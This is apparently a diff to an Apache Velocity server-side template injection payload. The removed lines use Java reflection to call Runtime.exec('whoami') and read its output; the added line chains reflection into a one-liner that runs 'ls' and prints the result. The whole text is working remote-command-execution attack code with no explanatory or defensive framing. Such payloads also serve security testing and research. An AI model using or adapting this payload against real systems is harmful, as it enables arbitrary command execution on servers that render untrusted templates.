@@ -1,13 +1,3 @@
-#set ($exp="exp")
-#set ($str=$exp.getClass().forName("java.lang.String"))
-#set ($chr=$exp.getClass().forName("java.lang.Character"))
-#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
-#set ($out=$a.getInputStream())
+#set($e="e")
+$e.getClass().forName('java.lang.Process').getMethod('getInputStream').invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).getClass().getMethod('exec', $e.getClass().forName('java.lang.String')).invoke( $e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) ,'ls')).toString()
 
-#set ($result="")
-#foreach($i in [2..$out.available()])
-    #set($tmp=$str.valueOf($chr.toChars($out.read())))
-    #set($result="$result$tmp")
-#end
-
-$result
